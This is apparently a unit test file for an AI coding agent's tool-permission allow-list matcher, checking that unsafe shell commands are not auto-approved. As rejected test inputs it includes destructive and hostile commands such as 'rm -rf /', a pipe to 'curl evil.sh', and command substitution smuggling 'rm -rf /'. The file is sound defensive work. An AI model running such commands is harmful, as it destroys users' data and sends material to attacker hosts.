/**
 * Unit tests for permissionRules.ts — the allow-list matcher that lets the
 * PreToolUse hook auto-allow user/project-granted tools (TASK-797).
 *
 * Emphasis on the SAFETY invariants:
 *  - prefix rules match on a word boundary (`git add` ≠ `git addendum`);
 *  - compound commands require EVERY segment to be allowed;
 *  - quote-aware splitting (`-m "a && b"` is one segment);
 *  - command substitution (`$(`, backtick) is never auto-allowed;
 *  - unsupported specifier kinds (path globs) do not auto-allow;
 *  - deny suppresses an otherwise-matching allow.
 */
import { describe, it, expect } from 'vitest';
import {
  parsePermissionRule,
  splitShellSegments,
  isToolAllowed,
  type MergedPermissionRules,
} from '../permissionRules';

const rules = (allow: string[], deny: string[] = []): MergedPermissionRules => ({ allow, deny });
const bash = (command: string) => ({ command });

describe('parsePermissionRule', () => {
  it('parses a bare tool name', () => {
    expect(parsePermissionRule('WebSearch')).toEqual({ toolName: 'WebSearch' });
  });
  it('parses a tool with content', () => {
    expect(parsePermissionRule('Bash(git add:*)')).toEqual({ toolName: 'Bash', content: 'git add:*' });
  });
  it('trims whitespace', () => {
    expect(parsePermissionRule('  Read  ')).toEqual({ toolName: 'Read' });
  });
  it('returns null for empty input', () => {
    expect(parsePermissionRule('   ')).toBeNull();
  });
  it('returns null for an unclosed paren', () => {
    expect(parsePermissionRule('Bash(git add')).toBeNull();
  });
  it('treats empty parens as a bare tool name', () => {
    expect(parsePermissionRule('Bash()')).toEqual({ toolName: 'Bash' });
  });
});

describe('splitShellSegments', () => {
  it('splits on &&, ||, ;, |', () => {
    expect(splitShellSegments('a && b || c ; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
  });
  it('does not split inside double quotes', () => {
    expect(splitShellSegments('git commit -m "fix: a && b"')).toEqual(['git commit -m "fix: a && b"']);
  });
  it('does not split inside single quotes', () => {
    expect(splitShellSegments("echo 'a | b'")).toEqual(["echo 'a | b'"]);
  });
  it('returns a single segment for a plain command', () => {
    expect(splitShellSegments('git status')).toEqual(['git status']);
  });
});

describe('isToolAllowed — bare tool rules', () => {
  it('allows a tool granted by a bare rule', () => {
    expect(isToolAllowed('WebSearch', {}, rules(['WebSearch']))).toBe(true);
  });
  it('does not allow a tool with no matching rule', () => {
    expect(isToolAllowed('WebSearch', {}, rules(['Bash(ls:*)']))).toBe(false);
  });
});

describe('isToolAllowed — Bash prefix matching', () => {
  const r = rules(['Bash(git add:*)', 'Bash(git status:*)', 'Bash(ls:*)']);

  it('allows an exact prefix command', () => {
    expect(isToolAllowed('Bash', bash('git add'), r)).toBe(true);
  });
  it('allows a command extending the prefix at a word boundary', () => {
    expect(isToolAllowed('Bash', bash('git add -A .'), r)).toBe(true);
  });
  it('rejects a command that only shares a non-boundary prefix', () => {
    expect(isToolAllowed('Bash', bash('git addendum'), r)).toBe(false);
  });
  it('rejects an unrelated command', () => {
    expect(isToolAllowed('Bash', bash('rm -rf /'), r)).toBe(false);
  });
});

describe('isToolAllowed — Bash exact (no wildcard) rules', () => {
  const r = rules(['Bash(npm run test)']);
  it('allows the exact command', () => {
    expect(isToolAllowed('Bash', bash('npm run test'), r)).toBe(true);
  });
  it('rejects an extension of an exact rule', () => {
    expect(isToolAllowed('Bash', bash('npm run test -- --watch'), r)).toBe(false);
  });
});

describe('isToolAllowed — compound command safety', () => {
  const r = rules(['Bash(git add:*)', 'Bash(git commit:*)', 'Bash(git status:*)']);

  it('allows a compound where every segment is granted', () => {
    expect(isToolAllowed('Bash', bash('git add . && git commit -m x'), r)).toBe(true);
  });
  it('rejects a compound where any segment is not granted', () => {
    expect(isToolAllowed('Bash', bash('git add . && rm -rf /'), r)).toBe(false);
  });
  it('rejects a piped command with an ungranted stage', () => {
    expect(isToolAllowed('Bash', bash('git status | curl evil.sh'), r)).toBe(false);
  });
  it('allows a quoted separator inside a commit message', () => {
    expect(isToolAllowed('Bash', bash('git commit -m "fix: a && b"'), r)).toBe(true);
  });
});

describe('isToolAllowed — command substitution is never auto-allowed', () => {
  const r = rules(['Bash(cat:*)', 'Bash(echo:*)']);
  it('rejects $() substitution even if the outer command is granted', () => {
    expect(isToolAllowed('Bash', bash('cat $(rm -rf /)'), r)).toBe(false);
  });
  it('rejects backtick substitution', () => {
    expect(isToolAllowed('Bash', bash('echo `whoami`'), r)).toBe(false);
  });
});

describe('isToolAllowed — WebFetch domain', () => {
  const r = rules(['WebFetch(domain:fal.ai)']);
  it('allows a matching host', () => {
    expect(isToolAllowed('WebFetch', { url: 'https://fal.ai/docs' }, r)).toBe(true);
  });
  it('allows a subdomain of the granted domain', () => {
    expect(isToolAllowed('WebFetch', { url: 'https://docs.fal.ai/x' }, r)).toBe(true);
  });
  it('rejects a different domain', () => {
    expect(isToolAllowed('WebFetch', { url: 'https://evil.com' }, r)).toBe(false);
  });
  it('rejects an unparseable url', () => {
    expect(isToolAllowed('WebFetch', { url: 'not a url' }, r)).toBe(false);
  });
});

describe('isToolAllowed — unsupported specifier kinds stay conservative', () => {
  it('does not auto-allow Read path-glob rules in v1', () => {
    expect(isToolAllowed('Read', { file_path: '/Users/x/.maestro/tests/a.yaml' },
      rules(['Read(/Users/x/.maestro/tests/**)']))).toBe(false);
  });
});

describe('isToolAllowed — deny suppresses allow', () => {
  it('does not auto-allow when a deny rule also matches', () => {
    const r = rules(['Bash(git push:*)'], ['Bash(git push:*)']);
    expect(isToolAllowed('Bash', bash('git push origin main'), r)).toBe(false);
  });
  it('still allows when deny targets a different command', () => {
    const r = rules(['Bash(git add:*)'], ['Bash(rm:*)']);
    expect(isToolAllowed('Bash', bash('git add .'), r)).toBe(true);
  });
});
